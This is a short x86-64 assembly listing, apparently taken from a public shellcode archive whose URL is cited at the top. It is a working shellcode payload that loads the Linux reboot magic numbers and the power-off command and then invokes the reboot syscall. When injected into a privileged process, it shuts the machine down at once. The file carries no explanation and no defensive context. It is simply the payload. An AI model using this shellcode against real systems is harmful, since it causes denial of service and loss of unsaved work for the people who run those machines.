; http://shell-storm.org/shellcode/files/shellcode-602.php 

global _start

section .text

_start:

mov     edx, 0x4321fedc ; reboot cmd power off 
mov     esi, 0x28121969 ; reboot magic 2
mov     edi, 0xfee1dead ; reboot magic 1
mov     al,  0xa9     ; reboot syscall 

syscall
